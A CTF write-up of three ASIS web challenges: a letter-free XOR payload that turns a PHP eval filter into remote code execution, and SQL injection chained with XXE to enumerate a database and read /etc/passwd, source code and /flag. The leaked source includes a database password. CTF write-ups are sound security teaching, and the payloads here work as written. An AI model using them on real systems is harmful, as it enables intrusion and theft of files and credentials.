Table of contents
- [Web](#web)
  - [Web Warm-up](#web-warm-up)
  - [Treasury #1](#treasury-1)
  - [Treasury #2](#treasury-2)

# <a name="web"></a> Web
## <a name="web-warm-up"></a> Web Warm-up
Points: 35
#### Description
>Warm up! Can you break all the tasks? I'll pray for you!
>
>read flag.php
>
>Link: [Link](http://69.90.132.196:5003/?view-source)
### Solution
When we access the link we get the next code:
```php
 <?php
if(isset($_GET['view-source'])){
    highlight_file(__FILE__);
    die();
}

if(isset($_GET['warmup'])){
    if(!preg_match('/[A-Za-z]/is',$_GET['warmup']) && strlen($_GET['warmup']) <= 60) {
    eval($_GET['warmup']);
    }else{
        die("Try harder!");
    }
}else{
    die("No param given");
} 
```
We need to provide a value for `warmup` that must not containes letters, have a length less or equal than 60 and contain a payload that will get us the flag.

Searching for `php eval exploit without letters` I found this [article](https://www.programmersought.com/article/7881105401/). Here I saw that you can get letters by XOR-ing strings that contain only special characters. For example, php will interpret `"{" ^ "<"` as `G`. Going further with this we can make the source code evaluate an expression with the restricted parameter, but using another parameter from the query string that is not restricted. We want to achive something like `eval("_GET['another_parameter']")`.

As you can see from the article, we can write `GET` as `"{{{"^"<>/"`. Using this, we can achive RCE with the next exploit: ```$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);```. Breaking it down, we have:
- `$_="_GET"` (a variable called `_` with the value `_GET`)
- `${$_}[_]` (invoking `$_GET[_]` that will take the value from the query parameter called `_`. We will use this to pass a function)
- `(${$_}[__]);` (this will translate into `($_GET[__])`. We will use this as argument for the function we choose to pass)

The request's parameters that will get us the flag:

![image](https://user-images.githubusercontent.com/38787278/86500203-3203a600-bd98-11ea-9ee0-bb044116a974.png)

Flag: ASIS{w4rm_up_y0ur_br4in}

## <a name="treasury-1"></a> Treasury #1
Points: 57
#### Description
>[A Cultural Treasury](https://poems.asisctf.com/)
### Solution
The site prompts us with a list of items, each one with two available actions:
- excerpt: view a fragment from the file
- read online: open a link from another domain(outside of the challenge scope)

![image](https://user-images.githubusercontent.com/38787278/86515410-5ce60c80-be21-11ea-95eb-6b1c26d9c20a.png)

I played a little with the site and this is everything that I found interesting:

![image](https://user-images.githubusercontent.com/38787278/86515461-a5052f00-be21-11ea-970e-9ae35a65212f.png)

We can make calls to get fragments of the books by providing the id of what we want to see. I played a little with the `type` parameter, but beside the values `excerpt` and `list` there's nothing else there. At this point I start trying for SQL injection on the `id` parameter.

There seems to be only entries with the id 1,2 and 3. If we enter any other value we get a HTTP 200 response with an empty body. So, if we provide the id 4, we get nothing. Keeping that in mind we try `4' or id='3` and we get the fragment that coresponds to id 3. Sweet!

![image](https://user-images.githubusercontent.com/38787278/86515633-0e397200-be23-11ea-88c3-31e9fbb6c910.png)

Let's get the number of columns: `null' union select 'null`

![image](https://user-images.githubusercontent.com/38787278/86515697-8d2eaa80-be23-11ea-90ce-4424ce0162d3.png)

Seems that the output from the database should be XML to be parsed by `simplexml_load_string()`. So, now we have to combine SQLi with XXE to advance.
Below are the payloads used with a description and the information gathered.

| Payload | Description | Information |
|---------|-------------|-------------|
|```4' union select '<root><id>4</id><excerpt>a</excerpt></root>``` | Finding the structure of XML | returns `a`, so we can control the field `<exceprt></expert>`|
|```4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "file:///etc/passwd">]><root><id>4</id><excerpt>&test;</excerpt></root>``` | We test for XXE | We can view the content from /etc/passwd, so we can further exploit |
|```4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=books.php">]><root><id>4</id><excerpt>&test;</excerpt></root>``` | We retrieve as base64 the content from the `books.php` | Get the source code. [see below](#books.php) |
|```4' union select concat('<root><id>4</id><excerpt>',database(),'</excerpt></root>') where 'a'='a``` | Get the current DB | `ASISCTF`|
|```4' union select group_concat('<root><id>4</id><excerpt>',schema_name,'</excerpt></root>') from information_schema.schemata where ''=' -> returns information_schema``` | Try to get all the DBs | We get an error because this will have multiple `root` elements|
|```4' union select concat('<root><id>4</id><excerpt>',(select group_concat(0x7c,schema_name,0x7c) from information_schema.schemata),'</excerpt></root>') where ''='``` | Get all the DBs | We get `information_schema,ASISCTF`|
|```4' union select concat('<root><id>4</id><excerpt>',(select group_concat(0x7c,table_name,0x7c) from information_schema.tables where table_schema='ASISCTF'),'</excerpt></root>') where ''='```| Get tables from `ASISCTF` | We get `books`|
|```4' union select concat('<root><id>4</id><excerpt>',(select group_concat(0x7c,column_name,0x7c) from information_schema.columns where table_name='books'),'</excerpt></root>') where ''='```| Get columns from `books`| We get `id,info`|
|```4' union select concat('<root><id>4</id><excerpt>',(select group_concat(0x7c,id,0x7c) from books),'</excerpt></root>') where ''='```| Get all the ids, maybe something is hidden | We get `1,2,3`|
|```4' union select concat('<root><id>4</id><excerpt>',REPLACE((select group_concat(0x7c,info,0x7c) from books),'<','?'),'</excerpt></root>') where ''='```|Get the values from `info`| We get the flag: `?flag>OK! You can use ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884} flag, but I keep the `/flag` file secure :-/?/flag>`. I had to replace the `<` to get a valid XML.
 
<a name="books.php"></a> books.php:

```php
<?php
sleep(1);

function connect_to_database() {
  $link = mysqli_connect("web4-mariadb", "ctfuser", "dhY#OThsdivojq2", "ASISCTF");
  if (!$link) {
    echo "Error: Unable to connect to DB.";
    exit;
  }
  return $link;
}

function fetch_books($condition) {
  $link = connect_to_database();
  if ($condition === "") {
    $where_condition = "";
  } else {
    $where_condition = "WHERE $condition";
  }
  $query = "SELECT info FROM books $where_condition";
  if ($result = mysqli_query($link, $query, MYSQLI_USE_RESULT)) {
    $books_info = array();
    while($row = $result->fetch_array(MYSQLI_NUM)) {
      $books_info[] = (string) $row[0];
    }
    mysqli_free_result($result);
  }
  mysqli_close($link);
  return $books_info;
}

function xml2array($xml) {
  return array(
    'id' => (string) $xml->id,
    'name' => (string) $xml->name,
    'author' => (string) $xml->author,
    'year' => (string) $xml->year,
    'link' => (string) $xml->link
  );
}

function get_all_books() {
  $books = array();
  $books_info = fetch_books("");
  foreach ($books_info as $info) {
    $xml = simplexml_load_string($info, 'SimpleXMLElement', LIBXML_NOENT);
    $books[] = xml2array($xml);
  }
  return $books;
}

function find_book($condition) {
  $book_info = fetch_books($condition)[0];
  $xml = simplexml_load_string($book_info, 'SimpleXMLElement', LIBXML_NOENT);
  return $xml;
}

$type = @$_GET["type"];
if ($type === "list") {
  $books = get_all_books();
  echo json_encode($books);

} elseif ($type === "excerpt") {
  $id = @$_GET["id"];
  $book = find_book("id='$id'");
  $bookExcerpt = $book->excerpt;
  echo $bookExcerpt;

} else {
  echo "Invalid type";
}
```

Flag: ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884}

## <a name="treasury-2"></a> Treasury #2
Points: 59
#### Description
>[A Cultural Treasury](https://poems.asisctf.com/)
### Solution
For full write-up please read the solution from [Treasury #1](#treasury-1). The challenges are related and I should copy almost everything from the write-up of the first challenge. As a summary: we can SQLi on the `id` parameter and from there we have to do a XXE to get the flag. If this doesn't make sense, please read the write-up of the first challenge.

After solving the previous challenge we get the next information:
>```<flag>OK! You can use ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884} flag, but I keep the `/flag` file secure :-/</flag>```

We can combine SQLi with XXE to retrive the flag from `/flag`.

Payload: ```4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "file:///flag">]><root><id>4</id><excerpt>&test;</excerpt></root>```

![image](https://user-images.githubusercontent.com/38787278/86520163-28d31180-be4a-11ea-8753-182d6e61c8cc.png)

Flag: ASIS{03482b1821398ccb5214d891aed35dc87d3a77b2}
